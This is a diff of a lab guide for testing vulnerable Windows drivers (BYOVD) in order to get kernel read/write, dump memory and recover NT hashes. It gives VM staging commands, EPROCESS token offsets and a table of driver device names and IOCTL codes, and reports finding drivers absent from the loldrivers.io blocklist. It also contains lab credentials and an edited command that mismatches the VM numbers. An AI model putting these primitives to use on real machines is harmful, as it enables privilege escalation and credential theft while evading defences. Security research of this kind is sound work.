@@ -1,8 +1,12 @@
 # Manual Driver Testing Guide
 
-**Date:** 2026-09-08
-**Scope:** BYOVD candidate drivers from `drivers_23/candidates.csv` (49 drivers, 14 families).
+> **Note:** Test results consolidated into **[../BYOVD-DRIVER-MATRIX.md](../BYOVD-DRIVER-MATRIX.md)**. This document contains testing procedures only.
+
+**Date:** 2026-09-09 (updated)  
+**Scope:** BYOVD candidate drivers from `drivers_23/candidates.csv` (49 drivers, 14 families) + novel drivers.
 Isolated lab only. Authorized per CLAUDE.md.
+
+**2026-09-08 Update:** Found 3 novel drivers NOT on loldrivers.io. RtsPpx.sys confirmed working. See [NOVEL-DRIVER-CANDIDATES.md](docs/NOVEL-DRIVER-CANDIDATES.md).
 
 ---
 
@@ -11,19 +15,21 @@ Isolated lab only. Authorized per CLAUDE.md.
 | Item | Value |
 |---|---|
 | Proxmox host | `root@192.168.36.225` |
-| Test VM | **VM 126**, Windows 11 22H2, build 22621 |
-| VM IP | `192.168.36.x` (DHCP on lab VLAN, confirm with `qm guest exec 126 -- ipconfig`) |
+| Test VM | **VM 125**, Windows 11 22H2 x64, build 22621 |
+| VM IP | `192.168.36.210` (static) |
+| VM credentials | `localuser:password` |
 | Snapshot (clean) | `byovd-files-ready` (Defender off, cascade.exe + drivers pre-staged at `C:\Users\Public\byovd\`) |
 | Staging path on guest | `C:\Users\Public\byovd\` |
 | EPROCESS offsets (22621) | UniqueProcessId=0x440, ActiveProcessLinks=0x448, Token=0x4B8, Protection=0x87A, ImageFileName=0x5A8 |
 | Analysis box | macOS (this machine), pypykatz installed |
+| Local VM (Fusion) | `baddrivers_vm` — Windows 11 22H2 x64, encrypted |
 
-**VM 125** (.210) is the driver enumeration VM. Use it for `run-enum.sh` discovery. Use **VM 126** for all exploitation testing.
+> **WARNING:** VM 126 is ARM64 Windows. All drivers in bigDrivers are x86-64 and CANNOT load on ARM64 (error 1275). Use **VM 125** for all BYOVD testing.
 
 ### Reverting to clean state
 
 ```bash
-ssh root@192.168.36.225 "qm rollback 126 byovd-files-ready && qm start 126"
+ssh root@192.168.36.225 "qm rollback 125 byovd-files-ready && qm start 126"
 sleep 40   # wait for guest agent
 ```
 
@@ -381,7 +387,7 @@ sc stop TestDrv
 sc delete TestDrv
 
 # Or just revert the snapshot:
-# ssh root@192.168.36.225 "qm rollback 126 byovd-files-ready"
+# ssh root@192.168.36.225 "qm rollback 125 byovd-files-ready"
 ```
 
 ---
@@ -395,6 +401,9 @@ After testing each driver, update the matrix below. Copy this table into `notes/
 | Driver | SHA256 (first 16) | Version | Load? | Device OK? | test-rw? | Dump? | NT Hash? | Notes |
 |---|---|---|---|---|---|---|---|---|
 | BiosToolCommon | (baseline) | N/A | YES | YES | PASS | PASS | YES | Confirmed 2026-08-28 |
+| **RtsPpx (NOVEL)** | 0259226bce1a4132 | N/A | YES | YES | **PASS** | TBD | TBD | **CONFIRMED 2026-09-08, NOT on loldrivers** |
+| **RwDrv (NOVEL)** | 6c32b33f0a2ebf79 | N/A | TBD | TBD | TBD | TBD | TBD | Novel hash, backend ready |
+| **RMDRVSYS (NOVEL)** | b24f0d3db0a24214 | N/A | TBD | TBD | TBD | TBD | TBD | Needs Ghidra RE |
 | WinRing0 (Acer) | 63e49412093cd757 | 1.2.0.5 | | | | | | Blocked by SecureBoot last time |
 | WinRing0 (ASUS) | d052767066dd5ee9 | 1.2.0.5 | | | | | | Try WHQL-signed variant |
 | AsIO3 | 95b6c8f8747c0652 | 1.04.04 | | | | | | Port-only last time, re-check |
@@ -418,7 +427,7 @@ scp drivers_23/bigDrivers/${HASH}.sys root@192.168.36.225:/tmp/TestDriver.sys
 # 2. Push from Proxmox into VM 126 via qm guest exec
 ssh root@192.168.36.225 "
   cat /tmp/TestDriver.sys | base64 | \
-  qm guest exec 126 -- powershell -Command \
+  qm guest exec 125 -- powershell -Command \
     '[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\byovd\\TestDriver.sys\", [Convert]::FromBase64String((Read-Host)))'
 "
 
@@ -469,17 +478,19 @@ Key functions to search for in Ghidra (indicates exploitable primitives):
 
 ## Quick Reference: cascade.exe Driver-Type Flags
 
-| `--driver-type` | Driver family | Device name | Read IOCTL | Write IOCTL |
-|---|---|---|---|---|
-| `biostool` | BiosToolCommonDriver | `\\.\BiosToolCommonDriver` | 0x22202C | 0x222030 |
-| `winring0` | WinRing0 | `\\.\WinRing0_1_2_0` | 0x9C402584 | 0x9C402588 |
-| `ntiolib` | NTIOLib (MSI) | `\\.\NTIOLib_MysticLight` | 0x9C40A428 | 0x9C40A424 |
-| `asio3` | AsIO3 (ASUS) | `\\.\Asusgio3` | 0x22200C | 0x222008 |
-| `lnvmsrio` | LnvMSRIO (Lenovo) | `\\.\WinMsrDev` | 0x9C402584 | 0x9C402588 |
-| `iomap` | IOMap (ASUS) | `\\.\IOMap` | 0x80102040 | 0x80102044 |
-| `ktapi` | ktapi | (service-dependent) | 0x82007000 | 0x82007100 |
-| `pdfwkrnl` | PdFwKrnl (AMD) | `\\.\Global\PdFwKrnl` | 0x80002014 | 0x80002014 |
-| `directio` | DirectIo64 | (dynamic service name) | 0x8011E044 | 0x8011E0A0 |
+| `--driver-type` | Driver family | Device name | Read IOCTL | Write IOCTL | Notes |
+|---|---|---|---|---|---|
+| `biostool` | BiosToolCommonDriver | `\\.\BiosToolCommonDriver` | 0x22202C | 0x222030 | CONFIRMED |
+| `rtsppx` | RtsPpx (Realtek) | `\\.\RtsPpx` | 0x222000 | 0x222008 | **NOVEL, CONFIRMED** |
+| `rwdrv` | RwDrv (lab-z) | `\\.\fmem3` | 0x80002000 | 0x80002004 | **NOVEL hash** |
+| `winring0` | WinRing0 | `\\.\WinRing0_1_2_0` | 0x9C402584 | 0x9C402588 | |
+| `ntiolib` | NTIOLib (MSI) | `\\.\NTIOLib_MysticLight` | 0x9C40A428 | 0x9C40A424 | |
+| `asio3` | AsIO3 (ASUS) | `\\.\Asusgio3` | 0x22200C | 0x222008 | |
+| `lnvmsrio` | LnvMSRIO (Lenovo) | `\\.\WinMsrDev` | 0x9C402584 | 0x9C402588 | |
+| `iomap` | IOMap (ASUS) | `\\.\IOMap` | 0x80102040 | 0x80102044 | |
+| `ktapi` | ktapi | (service-dependent) | 0x82007000 | 0x82007100 | |
+| `pdfwkrnl` | PdFwKrnl (AMD) | `\\.\Global\PdFwKrnl` | 0x80002014 | 0x80002014 | |
+| `directio` | DirectIo64 | (dynamic service name) | 0x8011E044 | 0x8011E0A0 | |
 
 ---
 
